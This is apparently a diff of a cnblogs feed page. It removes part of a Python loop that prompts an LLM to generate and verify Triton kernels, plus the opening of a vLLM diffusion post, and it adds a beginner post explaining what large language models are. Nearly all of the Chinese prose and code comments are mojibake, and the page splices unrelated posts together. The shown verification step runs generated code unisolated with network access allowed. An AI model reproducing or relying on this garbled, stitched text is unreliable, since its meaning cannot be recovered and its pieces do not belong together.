-        if i == 1 or last_code is None:
-            prompt = _build_composition_prompt(
-                problem_code, subgraphs, kernels, target_platform=platform
-            )
-        else:
-            # éç¬¬ä¸è½® â åºäºä¸ä¸è½®çéè¯¯ä¿¡æ¯æå»ºä¼åPrompt
-            # æåéªè¯æ¥å¿çæå2000å­ç¬¦ï¼ä¾¿äºLLMå®ä½é®é¢ï¼
-            stderr_tail = ""
-            stdout_tail = ""
-            try:
-                # è¯»åæ åéè¯¯æ¥å¿å°¾é¨
-                if verify_info.get("stderr_path"):
-                    with open(
-                        verify_info["stderr_path"],
-                        "r",
-                        encoding="utf-8",
-                        errors="ignore",
-                    ) as f:
-                        stderr_tail = f.read()[-2000:]
-                # è¯»åæ åè¾åºæ¥å¿å°¾é¨
-                if verify_info.get("stdout_path"):
-                    with open(
-                        verify_info["stdout_path"],
-                        "r",
-                        encoding="utf-8",
-                        errors="ignore",
-                    ) as f:
-                        stdout_tail = f.read()[-2000:]
-            except Exception:
-                # æ¥å¿è¯»åå¤±è´¥åå¿½ç¥ï¼é¿åä¸­æ­è¿­ä»£ï¼
-                pass
-            # æå»ºä¼åPromptï¼åå«ä¸ä¸è½®ä»£ç åéè¯¯ä¿¡æ¯ï¼
-            prompt = _build_refinement_prompt(
-                problem_code,
-                subgraphs,
-                kernels,
-                previous_code=last_code,
-                error_info={"stderr_tail": stderr_tail, "stdout_tail": stdout_tail},
-                target_platform=platform,
-            )
-
-        # ä¿å­å½åè½®æ¬¡çPromptï¼ä¾¿äºè¿½æº¯åè°è¯ï¼
-        (attempts_dir / f"attempt_{i}.prompt.txt").write_text(prompt, encoding="utf-8")
-        # è°ç¨LLMçæä»£ç ï¼
-        # - æ¶æ¯æ ¼å¼ï¼ä»åå«userè§è²çPrompt
-        # - æå¤§çæTokenæ°ï¼50000ï¼ééé¿ä»£ç çæï¼
-        response = provider.get_response(
-            model_name, [{"role": "user", "content": prompt}], max_tokens=50000
-        )
-        # è®°å½æåä¸æ¬¡LLMè°ç¨çtokenä½¿ç¨ä¿¡æ¯
-        last_usage = response.usage
-        # æåLLMè¾åºçåå§ææ¬
-        raw_text = response.content or ""
-
-        # ä»LLMè¾åºä¸­æåPythonä»£ç ï¼å¥ç¦»æ å³ææ¬ï¼
-        extracted = extract_single_python_file(raw_text)
-        code = extracted.code
-        # èªå¨ä¿®å¤Tritonå¸¸è§é®é¢ï¼ææ¬è¡¥ä¸ï¼
-        code, changed = _auto_patch_common_triton_issues(code, platform)
-        # ä¿å­å½åè½®æ¬¡ççæä»£ç 
-        (attempts_dir / f"attempt_{i}.py").write_text(code, encoding="utf-8")
-        # æ´æ°last_codeä¸ºå½åè½®æ¬¡çä»£ç 
-        last_code = code
-
-        # éªè¯å½åè½®æ¬¡çä»£ç ï¼è¥å¼å¯éªè¯ï¼
-        if verify:
-            # è¿è¡åéä»£ç éªè¯ï¼
-            # - artifacts_code_path: å½åè½®æ¬¡çä»£ç è·¯å¾
-            # - run_root: éªè¯è¿è¡ç®å½
-            # - timeout_s: éªè¯è¶æ¶æ¶é´ï¼2400ç§ï¼
-            # - isolated: ééç¦»æ¨¡å¼
-            # - deny_network: åè®¸ç½ç»è®¿é®
-            rr = run_candidate(
-                artifacts_code_path=attempts_dir / f"attempt_{i}.py",
-                run_root=out_dir / "runs",
-                timeout_s=2400,
-                isolated=False,
-                deny_network=False,
-            )
-            # è®°å½éªè¯ä¿¡æ¯
-            verify_info = {
-                "verify_rc": rr.rc,  # éªè¯éåºç 
-                "verify_passed": rr.passed,  # æ¯å¦éªè¯éè¿
-                "verify_reason": rr.reason,  # éªè¯ç»æåå 
-                "validator": rr.validator_used,  # ä½¿ç¨çéªè¯å¨
-                "stdout_path": str(rr.stdout_path),  # æ åè¾åºæ¥å¿è·¯å¾
-                "stderr_path": str(rr.stderr_path),  # æ åéè¯¯æ¥å¿è·¯å¾
-            }
-            # è¥éªè¯éè¿ï¼ç»æ­¢è¿­ä»£ï¼æ éç»§ç»­ä¼åï¼
-            if rr.passed:
-                break
-        else:
-            # è¥æªå¼å¯éªè¯ï¼ä»æ§è¡ç¬¬ä¸è½®åç»æ­¢
-            break
-
-    # ä¿å­æç»åæçç®å­ä»£ç ï¼åæåä¸è½®çä»£ç ï¼
-    composed_path = out_dir / "composed_kernel.py"
-    composed_path.write_text(last_code or "", encoding="utf-8")
-
-    # æå»ºç»æå­å¸ï¼åå«æ ¸å¿åæä¿¡æ¯
-    result: dict[str, Any] = {
-        # æåç¶æï¼éªè¯æ¨¡å¼ä¸ä¸ºæ¯å¦éè¿éªè¯ï¼ééªè¯æ¨¡å¼ä¸é»è®¤æå
-        "success": bool(verify_info.get("verify_passed", not verify)),
-        # æç»åæä»£ç çç»å¯¹è·¯å¾
-        "composed_path": str(composed_path.resolve()),
-        # ä½¿ç¨çLLMæ¨¡ååç§°
-        "model": model_name,
-        # LLM tokenä½¿ç¨ä¿¡æ¯
-        "usage": last_usage,
-        # å®éè¿­ä»£æ¬¡æ°
-        "rounds": i,
-        # ç®æ å¹³å°
-        "target_platform": target_platform,
-    }
-    # åå¹¶éªè¯ä¿¡æ¯å°ç»æå­å¸
-    result.update(verify_info)
-
-    # ä¿å­åææè¦ï¼ç»æåJSONæä»¶ï¼
-    (out_dir / "composition_summary.json").write_text(
-        json.dumps(result, indent=2), encoding="utf-8"
-    )
-    # è¿åç»æå­å¸
-    return result
-</code></pre>
-<h2 id="0xff-åè">0xFF åè</h2>
-
+                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<h1>å®æ´å­¦ä¹ LLM(äº):å¤§æ¨¡åå°åºæ¯ä»ä¹</h1>
+<p>å¥½å®¶ä¼,</p>
+<p>ä¸ä¸ç¯ç®æ¯æè¿ä¸ªç³»åå¼äºä¸ªå¤´.</p>
+<p>æå½æ¶ç»èªå·±å®äºä¸ä¸ªç®æ :</p>
+<pre><code class="language-text">ä¸è¦åªåçå¨ä¼è° API.
+è¦æå¤§æ¨¡åä»åçå°è½å°è¿æ¡è·¯æ¢æ¢èµ°ä¸é.</code></pre>
+<p>é£ä»å¤©å°±ä»æåºç¡çé®é¢å¼å§:</p>
+<pre><code class="language-text">å¤§æ¨¡åå°åºæ¯ä»ä¹?</code></pre>
+<p>è¿ä¸ªé®é¢çèµ·æ¥ç®å.</p>
+<p>ä½çè¦è¯´æ¸æ¥,å¶å®ä¸å®¹æ.</p>
+<p>å ä¸ºå®å¾å®¹æè¢«è®²å¾ç¹å«ç.</p>
+<p>æ¯å¦æäººä¼è¯´å®å¨æè.</p>
+<p>ä¹æäººä¼è¯´å®åªæ¯æ¦çæ¥é¾.</p>
+<p>è¿ä¸¤ä¸ªè¯´æ³é½æä¸ç¹éç,ä½å¦æåªè®°è¿ä¸¤å¥è¯,è¿æ¯å¾é¾è½å°é¡¹ç®é.</p>
+<p>æä»¥è¿ç¯ææ³æ¢ä¸ä¸ªè§åº¦:</p>
+<pre><code class="language-text">åä¸æ¥çè®²è®ºæ.
+åæ¿æ®éç¨åºåå¤§æ¨¡åå¯¹æ¯ä¸ä¸.</code></pre>
+<p>ççå®å°åºåæä»¬å¹³æ¶åçä»£ç æä»ä¹ä¸ä¸æ ·.</p>
+<h2>0.èæ¯:æä¸å¼å§æå®æ³ç®åäº</h2>
+<p>åå¼å§ç¨ ChatGPT çæ¶å,æå¶å®å¾èªç¶å°æå®å½æä¸ä¸ªæ´èªæçæç´¢æ¡.</p>
+<p>æé®:</p>
+<pre><code class="language-text">Docker æä¹é¨ç½² Go åç«¯?
+RAG æ¯ä»ä¹?
+è¿ä¸ªéè¯¯æä¹è§£å³?</code></pre>
+<p>å®åç­å¾å¾é¡º.</p>
+<p>æä»¥å¾å®¹æäº§çä¸ç§éè§:</p>
+<pre><code class="language-text">å¤§æ¨¡å = ä¸ä¸ªç¥è¯å¾å¤çé®ç­ç³»ç»</code></pre>
+<p>ä½åé¢å RAG çæ¶å,æåç°è¿ä¸ªçè§£ä¸å¤.</p>
+<p>å ä¸ºå¦æå¤§æ¨¡åççæ¯ä¸ä¸ªç¥è¯åº,é£å®åºè¯¥è½ç²¾ç¡®æ¥èµæ.</p>
+<p>ä½å®ä¸è½.</p>
+<p>å¦æå¤§æ¨¡åççæ¯ä¸ä¸ªæ°æ®åº,é£æé®:</p>
+<pre><code class="language-text">ç­éåºæææ»å»åå¤§äº 50 çè£å¤</code></pre>
+<p>å®åºè¯¥å SQL ä¸æ ·ç¨³å®.</p>
+<p>ä½å®ä¹ä¸éåç´æ¥å¹²è¿ä¸ª.</p>
+<p>æä»¥æå¼å§æè¯å°:</p>
+<pre><code class="language-text">å¤§æ¨¡åä¸æ¯æ°æ®åº.
+å¤§æ¨¡åä¹ä¸æ¯æç´¢å¼æ.
+å®æ´åä¸ä¸ªåºäºä¸ä¸æçæææ¬çæ¨¡å.</code></pre>
+<p>è¿å¥è¯å¬èµ·æ¥æç¹æ½è±¡.</p>
+<p>æä»¬æ¢æ¢æ.</p>
+<h2>1.æ®éç¨åºæ¯æä¹å·¥ä½ç</h2>
+<p>åçæä»¬çæçæ®éç¨åº.</p>
+<p>æ¯å¦åä¸ä¸ªç®åçè§å:</p>
+<pre><code class="language-python">def check_attack(power: int) -&gt; str:
+    if power &gt; 50:
+        return "é«æ»å»è£å¤"
+    return "æ®éè£å¤"</code></pre>
+<p>è¿ä¸ªç¨åºçç¹ç¹å¾æç¡®:</p>
+<pre><code class="language-text">è§åæ¯äººåæ­»ç.
+è¾å¥ä¸æ ·,è¾åºåºæ¬ä¸æ ·.
+ç¨åºä¸ä¼èªå·±åæ¥.</code></pre>
+<p>å®ä¸çè§£ä»ä¹å«"å¼º".</p>
+<p>å®åªç¥é:</p>
+<pre><code class="language-text">power &gt; 50</code></pre>
+<p>æ»¡è¶³æ¡ä»¶å°±è¿åé«æ»å»è£å¤.</p>
+<p>ä¸æ»¡è¶³å°±è¿åæ®éè£å¤.</p>
+<p>è¿ç§ç¨åºå¾å¯é .</p>
+<p>åªè¦è§ååå¯¹,å®å°±ä¼æè§åæ§è¡.</p>
+<p>ä½å®çé®é¢ä¹å¾ææ¾:</p>
+<pre><code class="language-text">è§åæ²¡åå°çå°æ¹,å®å°±ä¸ä¼.</code></pre>
+<p>æ¯å¦ä½ é®å®:</p>
+<pre><code class="language-text">è¿ä»¶è£å¤éååºå®¢è¿æ¯æå£«?</code></pre>
+<p>å¦æä»£ç éæ²¡æåèä¸å¤æ­é»è¾,å®å°±åç­ä¸äº.</p>
+<p>æ®éç¨åºæ´åè¿æ ·:</p>
+<pre><code class="language-text">è¾å¥
+  -&gt; äººåå¥½çè§å
+  -&gt; ææ­¥éª¤æ§è¡
+  -&gt; è¾åº</code></pre>
+<h2>2.å¤§æ¨¡åä¸æ¯æ if else å¨åç­</h2>
+<p>å¤§æ¨¡åä¸ä¸æ ·.</p>
+<p>ä½ é®å®:</p>
+<pre><code class="language-text">è¿ä»¶è£å¤æ»å»å 60,æ´å»ç 20%,éåä»ä¹è§è²?</code></pre>
+<p>å®ä¸æ¯å¨ä»£ç éæ¾ä¸ä¸ªåºå®ç if else.</p>
+<p>å®æ´åæ¯å¨çè¿æ®µææ¬:</p>
+<pre><code class="language-text">æ»å»å 60
+æ´å»ç 20%
+éåä»ä¹è§è²</code></pre>
+<p>ç¶åæ ¹æ®è®­ç»ä¸­å­¦å°çè¯­è¨è§å¾,é¡¹ç®ç¥è¯,ä¸ä¸æçº¿ç´¢,å»çæä¸ä¸ªæå¯è½æ¥å¾ä¸çåç­.</p>
+<p>æµç¨å¤§æ¦æ¯:</p>
+<pre><code class="language-text">ç¨æ·è¾å¥
+  -&gt; åæ token
+  -&gt; è¿å¥æ¨¡åè®¡ç®
+  -&gt; é¢æµä¸ä¸ä¸ª token
+  -&gt; åé¢æµä¸ä¸ä¸ª token
+  -&gt; æ¼æå®æ´åç­</code></pre>
+<p>æ³¨æè¿éæå³é®çæ¯:</p>
+<pre><code class="language-text">å®ä¸æ¯ä¸æ¬¡æ§ååºæ´ç¯ç­æ¡.
+å®æ¯ä¸ç¹ç¹çæç.</code></pre>
+<p>æ¯å¦åç­:</p>
+<pre><code class="language-text">è¿ä»¶è£å¤æ´éååºå®¢.</code></pre>
+<p>å¯¹æ¨¡åæ¥è¯´,å®ä¸æ¯ä¸ä¸å­æè¿å¥è¯æ¿åºæ¥.</p>
+<p>èæ¯ç±»ä¼¼è¿æ ·:</p>
+<pre><code class="language-text">è¿
+è¿ä»¶
+è¿ä»¶è£å¤
+è¿ä»¶è£å¤æ´
+è¿ä»¶è£å¤æ´éå
+è¿ä»¶è£å¤æ´éååºå®¢</code></pre>
+<p>å½ç¶çå®è¿ç¨ä¸æ¯æä¸­æè¯è¿æ ·å,èæ¯æ token.</p>
+<p>ä½åè¿æ ·çè§£å°±å¤äº.</p>
+<p><img src="https://img2024.cnblogs.com/blog/2501855/202605/2501855-20260524182243030-1789455783.jpg" alt="æ®éç¨åºå LLM çæè·¯å·®å«"></p>
+<h2>3.é£"å¤§"å°åºå¤§å¨åªé</h2>
+<p>LLM éé¢ç L æ¯ Large.</p>
+<p>è¿ä¸ª"å¤§",ä¸æ¯è¯´å®è¾æ°å¤§.</p>
+<p>èæ¯å ä¸ªä¸è¥¿é½å¾å¤§:</p>
+<pre><code class="language-text">åæ°éå¤§
+è®­ç»æ°æ®å¤§
+è®¡ç®éå¤§
+ä¸ä¸æå¤çè½åè¶æ¥è¶å¤§</code></pre>
+<p>åæ°å¯ä»¥åç²æ´çè§£æ:</p>
+<pre><code class="language-text">æ¨¡ååé¨å­¦å°çè°èæé®.</code></pre>
+<p>æ®éç¨åºé,è§åæ¯äººåç.</p>
+<p>å¤§æ¨¡åé,å¾å¤è½åä¸æ¯äººä¸æ¡æ¡åè¿å»ç,èæ¯éè¿å¤§éææ¬è®­ç»åºæ¥ç.</p>
+<p>è®­ç»æ¶,æ¨¡åä¸æ­åä¸ä»¶äº:</p>
+<pre><code class="language-text">ç»å®åé¢çææ¬,
+è®©å®é¢æµåé¢åºè¯¥åºç°ä»ä¹.</code></pre>
+<p>é¢æµéäº,å°±è°æ´åæ°.</p>
+<p>è°æ´å¾å¤å¾å¤æ¬¡ä»¥å,å®å°±æ¢æ¢å­¦ä¼äºä¸äºä¸è¥¿:</p>
+<pre><code class="language-text">è¯­æ³
+å¸¸è¯
+ä»£ç æ ¼å¼
+é®ç­æ¹å¼
+æç« ç»æ
+ä¸åæ¦å¿µä¹é´çå³ç³»</code></pre>
+<p>æä»¥å®çèµ·æ¥åä¼åç­é®é¢.</p>
+<p>ä½åºå±æ´æ¥è¿:</p>
+<pre><code class="language-text">æ ¹æ®ä¸ä¸æ,çææåççåç»­ææ¬.</code></pre>
+<h2>4.ä¸ºä»ä¹å®è½åç­å¾å¤æ²¡è§è¿çé®é¢</h2>
+<p>è¿ä¸ªå°æ¹å¾å®¹æè¯¯è§£.</p>
+<p>æäººä¼è§å¾:</p>
+<pre><code class="language-text">æ¨¡ååç­åºæ¥äº,è¯´æå®è®­ç»æ¶è§è¿åæ.</code></pre>
+<p>ä¸ä¸å®.</p>
+<p>å¤§æ¨¡åä¸æ¯ç®åèä¹¦.</p>
+<p>å®ç¡®å®å¯è½è®°ä½ä¸é¨åè®­ç»åå®¹,ä½æ´éè¦çæ¯,å®å­¦å°äºå¤§éè¯­è¨æ¨¡å¼åç¥è¯å³ç³».</p>
+<p>æ¯å¦å®å­¦è¿å¾å¤ç±»ä¼¼åå®¹:</p>
+<pre><code class="language-text">Docker ç¨æ¥æååºç¨
+Nginx å¯ä»¥åååä»£ç
+PostgreSQL æ¯å³ç³»åæ°æ®åº
+Go å¯ä»¥ååç«¯æå¡</code></pre>
+<p>å½ä½ é®:</p>
+<pre><code class="language-text">Go åç«¯æä¹ç¨ Docker é¨ç½²?</code></pre>
+<p>å®å°±è½æè¿äºæ¨¡å¼ç»åèµ·æ¥,çæä¸ä¸ªçèµ·æ¥åççæ¹æ¡.</p>
+<p>è¿ä¹æ¯å®å¼ºçå°æ¹.</p>
+<p>å®ä¸æ¯åªè½åç­åºå®é®é¢.</p>
+<p>å®å¯ä»¥ç»å.</p>
+<p>ä½è¿ä¹æ¯å®å±é©çå°æ¹.</p>
+<p>å ä¸ºå®ç»ååºæ¥çä¸è¥¿,ä¸ä¸å®å°±æ¯ä½ é¡¹ç®éççå®æåµ.</p>
+<p>æ¯å¦å®å¯è½ä¼ç¼ä¸ä¸ªç«¯å£:</p>
+<pre><code class="language-text">æå¡è¿è¡å¨ 8080 ç«¯å£.</code></pre>
+<p>ä½ä½ çé¡¹ç®å®éå¯è½æ¯:</p>
+<pre><code class="language-text">æå¡è¿è¡å¨ 8888 ç«¯å£.</code></pre>
+<p>è¿æ¶åå®ä¸æ¯ææéªä½ .</p>
+<p>å®åªæ¯æ ¹æ®å¸¸è§æ¨¡å¼çæäºä¸ä¸ªçèµ·æ¥åççç­æ¡.</p>
+<p>è¿å°±æ¯ä¸ºä»ä¹åé¢éè¦ RAG.</p>
+<p>å ä¸ºé¡¹ç®äºå®ä¸è½åªé æ¨¡åèªå·±ç.</p>
+<h2>5.ä¸å¥è¯çè§£å¤§æ¨¡å</h2>
+<p>å¦æåä¸è¿½æ±ä¸¥è°¨,æç°å¨ä¼è¿æ ·çè§£ LLM:</p>
+<pre><code class="language-text">LLM æ¯ä¸ä¸ªç»è¿å¤§éææ¬è®­ç»å,
+è½å¤æ ¹æ®ä¸ä¸æä¸æ­é¢æµä¸ä¸ä¸ª token,
+æç»çæèªç¶è¯­è¨ãä»£ç ãç»æååå®¹çæ¨¡å.</code></pre>
+<p>è¿å¥è¯éé¢æå ä¸ªå³é®è¯.</p>
+<p>ç¬¬ä¸ä¸ª:</p>
+<pre><code class="language-text">å¤§éææ¬è®­ç»</code></pre>
+<p>è¯´æå®çè½åæ¥èªè®­ç»æ°æ®åè®­ç»è¿ç¨.</p>
+<p>ç¬¬äºä¸ª:</p>
+<pre><code class="language-text">ä¸ä¸æ</code></pre>
+<p>è¯´æä½ ç»å®ä»ä¹ä¿¡æ¯,ä¼ç´æ¥å½±åå®æä¹åç­.</p>
+<p>ç¬¬ä¸ä¸ª:</p>
+<pre><code class="language-text">é¢æµä¸ä¸ä¸ª token</code></pre>
+<p>è¯´æå®ççæè¿ç¨ä¸æ¯æ¥è¡¨,èæ¯ä¸æ­¥æ­¥ç»­å.</p>
+<p>ç¬¬åä¸ª:</p>
+<pre><code class="language-text">çæ</code></pre>
+<p>è¯´æå®æé¿çæ¯ç»ç»ç­æ¡,è§£éåå®¹,æ¹åææ¬,åä»£ç ,æ»ç»ææ.</p>
+<p>ä½å®ä¸æ¯å¤©ç¶éååææäº.</p>
+<h2>6.å®éåä»ä¹,ä¸éåä»ä¹</h2>
+<p>å¤§æ¨¡åéååä»ä¹?</p>
+<p>æç°å¨ä¼ååè¿äº:</p>
+<pre><code class="language-text">è§£éæ¦å¿µ
+æ»ç»ææ¡£
+æ¹åè¡¨è¾¾
+çæä»£ç èç¨¿
+æ ¹æ®ä¸ä¸æç»ç»ç­æ¡
+æé¶æ£ä¿¡æ¯æ´çæç»æ</code></pre>
+<p>è¿äºä»»å¡é½æä¸ä¸ªå±åç¹:</p>
+<pre><code class="language-text">ä¸æ¯åªè¦ä¸ä¸ªç²¾ç¡®å¼.
+èæ¯éè¦çè§£ãç»ç»ãè¡¨è¾¾.</code></pre>
+<p>é£å®ä¸éåä»ä¹?</p>
+<p>æ¯å¦:</p>
+<pre><code class="language-text">ç²¾ç¡®ç­éæ°æ®åºè®°å½
+ä¸¥æ ¼è®¡ç®éé¢
+å¤æ­æéæ¯å¦åè®¸
+ç´æ¥å½å¯ä¸äºå®æ¥æº
+å¨æ²¡æèµææ¶åç­é¡¹ç®åé¨ç»è</code></pre>
+<p>è¿äºäºæä¸æ¯ä¸è½åå¤§æ¨¡åç»å.</p>
+<p>èæ¯ä¸è½åªé å¤§æ¨¡å.</p>
+<p>æ¯å¦:</p>
+<pre><code class="language-text">ç­éæ»å»åå¤§äº 50 çè£å¤</code></pre>
+<p>åºè¯¥è®©æ°æ®åºæéç½®è¡¨æ¥è¯¢æ¥å.</p>
+<p>å¤§æ¨¡åå¯ä»¥è´è´£çè§£ç¨æ·æå¾:</p>
+<pre><code class="language-text">ç¨æ·æ³ç­éè£å¤.
+ç­éæ¡ä»¶æ¯æ»å»å &gt; 50.</code></pre>
+<p>ä½æç»ç­éåºè¯¥äº¤ç»ç¡®å®æ§çç¨åº.</p>
+<p>è¿å°±æ¯æä¹åå RAG è¾¹çæ¶æ³è¡¨è¾¾çä¸è¥¿.</p>
+<p>å¤§æ¨¡åå¾å¼º,ä½å®ä¸æ¯ææé®é¢çå¯ä¸ç­æ¡.</p>
+<h2>7.æ¾å°é¡¹ç®éæä¹çè§£</h2>
+<p>å¦ææè¦åä¸ä¸ªçå®çå¤§æ¨¡ååºç¨,æä¸ä¼æç»æè®¾è®¡æ:</p>
+<pre><code class="language-text">ç¨æ·é®é¢ -&gt; å¤§æ¨¡å -&gt; ç­æ¡</code></pre>
+<p>è¿ä¸ªå¤ªç®å.</p>
+<p>çå®ä¸ç¹åºè¯¥æ¯:</p>
+<pre><code class="language-text">ç¨æ·é®é¢
+  -&gt; å¤§æ¨¡åçè§£æå¾
+  -&gt; å¤æ­éè¦ä»ä¹èµææå·¥å·
+  -&gt; æ¥ç¥è¯åº / æ¥æ°æ®åº / è° API
+  -&gt; æç»æäº¤åå¤§æ¨¡å
+  -&gt; å¤§æ¨¡åç»ç»æç»ç­æ¡</code></pre>
+<p>ä¹å°±æ¯è¯´:</p>
+<pre><code class="language-text">æ¨¡åè´è´£çè§£åè¡¨è¾¾.
+ç³»ç»è´è´£äºå®åå¨ä½.</code></pre>
+<p>è¿å¥è¯æè§å¾å¾éè¦.</p>
+<p>å ä¸ºå¾å¤å¤§æ¨¡åé¡¹ç®åºé®é¢,å°±æ¯ææ¨¡åå½æäºæ´ä¸ªç³»ç».</p>
+<p>ä½æ¨¡ååªæ¯æ ¸å¿ç»ä»¶.</p>
+<p>å®æè¾¹è¿éè¦:</p>
+<pre><code class="language-text">ææ¡£æ£ç´¢
+æ°æ®åºæ¥è¯¢
+æéæ§å¶
+å·¥å·è°ç¨
+æ¥å¿è®°å½
+ææè¯æµ</code></pre>
+<p>è¿äºä¸è¥¿ç»åèµ·æ¥,æåä¸ä¸ªè½è½å°çåºç¨.</p>
+<h2>8.å®¹æè¸©çå ä¸ªå</h2>
+<p>ç¬¬ä¸ä¸ªå:</p>
+<pre><code class="language-text">æå¤§æ¨¡åå½ç¥è¯åº.</code></pre>
+<p>å®ç¥éå¾å¤éç¨ç¥è¯,ä½ä¸ç¥éä½ çç§æèµæ.</p>
+<p>ç¬¬äºä¸ªå:</p>
+<pre><code class="language-text">æå¤§æ¨¡åå½æ°æ®åº.</code></pre>
+<p>å®å¯ä»¥å¸®ä½ çæ SQL,ä½ä¸åºè¯¥èªå·±å­æè§ç­æ°æ®.</p>
+<p>ç¬¬ä¸ä¸ªå:</p>
+<pre><code class="language-text">æå¤§æ¨¡åå½ç»å¯¹æ­£ç¡®çèå¸.</code></pre>
+<p>å®è¯´å¾å¾æµç,ä¸ä»£è¡¨å®ä¸å®å¯¹.</p>
+<p>ç¬¬åä¸ªå:</p>
+<pre><code class="language-text">ä»¥ä¸º prompt è½è§£å³ææé®é¢.</code></pre>
+<p>Prompt å¾éè¦,ä½å¦æç¼ºå°äºå®æ°æ®ãå·¥å·è½åãæéè¾¹ç,åè° prompt æ²¡ç¨.</p>
+<p>ç¬¬äºä¸ªå:</p>
+<pre><code class="language-text">ä¸æ¥å°±é®æä¹å¾®è°.</code></pre>
+<p>å¾å¤é®é¢ä¸æ¯å¾®è°é®é¢.</p>
+<p>å¯è½åªæ¯ä¸ä¸ææ²¡ç»å¤.</p>
+<p>å¯è½åºè¯¥ç¨ RAG.</p>
+<p>ä¹å¯è½åºè¯¥æ¥æ°æ®åº.</p>
+<h2>9.æ»ç»</h2>
+<p>è¿ç¯åä¸è®² Transformer,ä¹ä¸è®² Attention.</p>
+<p>åªåæå¤§æ¨¡åæ¾å°ä¸ä¸ªæ¯è¾æ´ç´ çä½ç½®ä¸:</p>
+<pre><code class="language-text">å®ä¸æ¯æ®é if else ç¨åº.
+å®ä¸æ¯æ°æ®åº.
+å®ä¸æ¯æç´¢å¼æ.
+å®æ¯ä¸ä¸ªæ ¹æ®ä¸ä¸æçæåå®¹çæ¨¡å.</code></pre>
+<p>ååç¼©ä¸ä¸:</p>
+<pre><code class="language-text">æ®éç¨åºæè§åæ§è¡.
+å¤§æ¨¡åæä¸ä¸æçæ.</code></pre>
+<p>è¿å°±æ¯ä»å¤©ææ³è®°ä½çåºå«.</p>
+<p>çè§£äºè¿ä¸ç¹,åé¢å¾å¤ä¸è¥¿å°±å¥½æ¥äº.</p>
+<p>æ¯å¦:</p>
+<pre><code class="language-text">ä¸ºä»ä¹ prompt ä¼å½±åè¾åº?
+ä¸ºä»ä¹ RAG è¦æèµææ¾è¿ä¸ä¸æ?
+ä¸ºä»ä¹æ¨¡åä¼è¡è¯´?
+ä¸ºä»ä¹åä¸ä¸ªé®é¢æ¯æ¬¡åç­å¯è½ä¸å?
+ä¸ºä»ä¹å®æ¯ä¸ç¹ç¹çæç­æ¡?</code></pre>
+<p>ä¸ä¸ç¯å°±é¡ºçè¿ä¸ªé®é¢å¾ä¸èµ°:</p>
+<pre><code class="language-text">ä¸ºä»ä¹å¤§æ¨¡åæ¬è´¨ä¸æ¯å¨é¢æµä¸ä¸ä¸ª token?</code></pre>
+<p>ä¹å°±æ¯ççæ¨¡åçæä¸å¥è¯æ¶,èåå°åºå¨åçä»ä¹.</p>
 
 </div>
 <div class="clear"></div>
 
             </div>
             <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-05-22 20:02">2026-05-22 20:02</span>&nbsp;
-<a href="https://www.cnblogs.com/rossiXYZ">ç½è¥¿çæè</a>&nbsp;
-éè¯»(<span id="post_view_count">49</span>)&nbsp;
+<span id="post-date" data-last-update-days="0.003472222222222222" data-date-updated="2026-05-24 18:28">2026-05-24 18:23</span>&nbsp;
+<a href="https://www.cnblogs.com/FatTiger4399">å»è¥èè</a>&nbsp;
+éè¯»(<span id="post_view_count">4</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(20124922);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2FrossiXYZ%2Fp%2F20124922&amp;targetId=20124922&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
-</div>
-         ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ åååååæä¸è¿æå§ï¼æ²¡æåæ³æ(vllm)å°±æ¯è¿ä¹å¼ºå¤§ï¼ ]]></title>
-    <link>https://www.cnblogs.com/JulianHuang/p/20141345</link>
-    <guid>abe21b806462d5b1d3d45c8555aada70</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/JulianHuang/p/20141345" title="åå¸äº 2026-05-24 13:20">
-    <span role="heading" aria-level="2">åååååæä¸è¿æå§ï¼æ²¡æåæ³æ(vllm)å°±æ¯è¿ä¹å¼ºå¤§ï¼</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<p>åæå¨å¾®ä¿¡å¬ä¼å·å¹³å°çäº ï¼æ¥è¿1wèªç¶éè¯»ï¼æçæå·²ç»æ»¡è¶³ä¸äºåä¸»çåäº«æ¬²ï¼ä»å¤©è®°å½vllmå§ä¸ä¸ªæçå¾æ¨¡åã</p>
-<p>å¨ææ¬çæé¢åï¼99%çåºç¨é½åºäºèªåå½æ¨¡åï¼Autoregressive Modelsï¼ï¼ä¹å°±æ¯æä»¬çç¥çGPTç³»åãLLaMAç­ã</p>
-<blockquote>
-<p>ææ¬ï¼Textï¼æ¯ç¦»æ£çï¼ç±è¯åï¼Tokenï¼ç»æï¼èå¾åãè§é¢æ¯è¿ç»­çåç´ æä¿¡å·ãæ©æ£æ¨¡åå¤©çæé¿å¤çè¿ç»­æ°æ®, ææçå¾åæçè§é¢çæ¯å½åæ©æ£æ¨¡åçæ ¸å¿æåºã</p>
-</blockquote>
-<h4 id="ä»ä¹æ¯æ©æ£æ¨¡ådiffusion-models">ä»ä¹æ¯æ©æ£æ¨¡ådiffusion models?</h4>
-<p>ä½¿ç¨æçå¾å·¥å·æ¶ï¼åé¨çå®åççâé­æ³âï¼</p>
-<p>èµ·ç¹ï¼ä½ çå°çå®å¨éæºçåªå£°å¾ãè¿ç¸å½äºååè¿ç¨èµ°å°äºç»ç¹ã</p>
-<p>ååå»åªç¬¬ä¸æ­¥ï¼</p>
-<p>æ¨¡åççè¿å¼ çº¯åªå£°å¾ï¼ç»åä½ çæç¤ºè¯ï¼é¢æµåºâè¿å¼ å¾ä¸ç°å¨åºè¯¥è¢«å ä¸äºä»ä¹åªå£°âã</p>
-<p>ç¶åï¼ä»å½åå¾çä¸­åå»è¿ä¸ªé¢æµåºçåªå£°ã</p>
-<p>ç»æå¾å°ä¸å¼ åªå£°å°äºä¸ç¹ç¹çãç¥å¾®è½çåºæ¨¡ç³è½®å»çå¾çã</p>
